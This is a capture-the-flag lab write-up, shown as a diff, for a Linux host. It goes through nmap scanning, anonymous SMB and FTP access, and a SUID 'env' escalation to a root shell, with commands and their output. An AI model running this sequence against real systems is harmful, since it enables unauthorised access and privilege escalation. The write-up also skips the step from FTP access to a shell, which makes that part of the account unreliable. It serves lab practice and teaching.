@@ -1,0 +1,165 @@
+## Nmap Scan
+
+I started with a basic port and version scan:
+
+```
+nmap -sS -sV 10.10.140.139
+```
+
+Output:
+```
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.0.8 or later
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+## SMB Enumeration
+
+I listed SMB shares using:
+
+```
+smbclient -L //10.10.140.139/ -N
+```
+
+Result:
+```
+Sharename       Type      Comment
+---------       ----      -------
+print$          Disk      Printer Drivers
+pics            Disk      My SMB Share Directory for Pics
+IPC$            IPC       IPC Service (anonymous server)
+```
+
+I then accessed the `pics` share anonymously:
+
+```
+smbclient //10.10.140.139/pics -N
+```
+
+Inside it, I found:
+```
+smb: \> ls
+  corgo2.jpg
+  puppos.jpeg
+```
+
+To find OS info and SMB versions, I ran:
+
+```
+nmap -p 139,445 --script=smb-os-discovery,smb-protocols 10.10.140.139
+```
+
+Key output:
+```
+smb-os-discovery:
+  OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+  Computer name: anonymous
+  Workgroup: WORKGROUP
+
+smb-protocols:
+  NT LM 0.12 (SMBv1) [dangerous, but default]
+  SMBv2 and SMBv3 supported
+```
+
+I tried `enum4linux` but didn’t find anything useful.
+
+## FTP Enumeration
+
+Since FTP was open, I tried logging in as anonymous:
+
+```
+ftp anonymous@10.10.140.139
+```
+
+Login was successful:
+```
+230 Login successful.
+```
+
+I listed files using `ls` and found the first flag.
+
+## Privilege Escalation
+
+After gaining FTP access, I ran the following commands to check for privilege escalation vectors:
+
+```
+whoami
+pwd
+cat /etc/crontab
+sudo -l
+find / -perm -4000 2>/dev/null
+```
+
+I found an interesting file: `/env`
+
+Checking GTFOBins for `env` revealed that if it has the SUID bit set, I can escalate using:
+
+```
+/usr/bin/env /bin/sh -p
+```
+
+- `/usr/bin/env` is a SUID binary.
+- `/bin/sh -p` runs a shell and preserves privileges due to the `-p` flag.
+
+This gave me a root shell.
+
+## Final Flag
+
+Once root, I accessed:
+
+```
+cat /root/root.txt
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
